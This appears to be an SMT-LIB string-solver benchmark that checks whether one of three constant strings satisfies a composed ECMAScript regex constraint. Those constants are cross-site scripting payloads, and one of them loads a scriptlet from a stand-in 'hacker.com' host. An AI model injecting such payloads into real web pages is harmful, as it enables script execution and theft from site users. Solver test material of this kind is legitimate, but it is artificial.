; lang_ops, BMP mode: x from a disjunction of constants, (negated) membership of x in a regex built by language operations from ECMAScript regexes
(set-logic QF_SLIA)
(set-info :status sat)
(declare-const x String)
(assert (or (= x "<script onreadystatechange=alert(1)></script>") (= x "<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://hacker.com/xss.html"">") (= x "<noframes onpaste=""alert(1)"" contenteditable>test</noframes>")))
(assert (str.in_re x (re.comp (re.diff ((_ re.from_regex ecma2020) "\d+(-\d+)*$") (re.comp (re.diff ((_ re.from_regex ecma2020) "^([A-Z]|[a-z]|[0-9]){8,11}$") ((_ re.loop 56 75) re.allchar)))))))
(check-sat)
